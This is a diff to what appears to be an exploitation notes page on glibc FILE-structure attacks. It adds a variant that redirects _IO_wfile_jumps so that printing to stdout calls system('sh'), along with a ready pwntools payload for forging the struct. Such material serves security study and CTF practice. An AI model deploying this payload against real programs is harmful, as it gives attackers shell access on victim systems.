@@ -224,9 +224,34 @@ f->vtable = &_IO_wfile_jumps; // +0xd8
 // _wide_data (can forge in heap etc)
 _wide_data->_IO_write_base = 0; // +0x18
 _wide_data->_IO_buf_base = 0; // +0x30
-_wide_data->_wide_vtable = *(&(system) - 0x68); // <ptr to (system - 0x68)> at +0xe0
+_wide_data->_wide_vtable = *(&(system) - 0x68); // <(ptr to system) - 0x68> at +0xe0
 ```
+### Another variant
 
-There are a few more gadget chains using `_IO_wfile_underflow_mmap`,
-`_IO_wdefault_xgetn`, `_IO_wfile_underflow`, `_IO_wdo_write` and
-`_IO_wfile_sync` which I will put here once I analyze them.
+Sometimes, we don't have the liberty to trigger exit. But we can simply shift
+the offset of the vtable to call `_IO_wfile_overflow{:c}` when it tries to call
+`_IO_wfile_xsputn{:c}`. This means that simply printing to the file will trigger
+the payload!
+
+For convenience, the below payload can be used to execute this variant, fully
+contained within the victim file struct.
+
+```py
+payload = flat({
+    0x00: b"  sh",
+
+    0x20: 0x0,
+    0x28: 0x1,
+
+    0x88: libc.sym._IO_stdfile_1_lock,
+    0xa0: libc.sym._IO_2_1_stdout_,
+    0xc0: 0x0,
+    0xd8: libc.sym._IO_wfile_jumps-0x20,
+
+    0x18: 0x0,
+    0x30: 0x0,
+    0xe0: libc.sym._IO_2_1_stdout_,
+
+    0x68: libc.sym.system
+}, filler=b"\x00")
+```
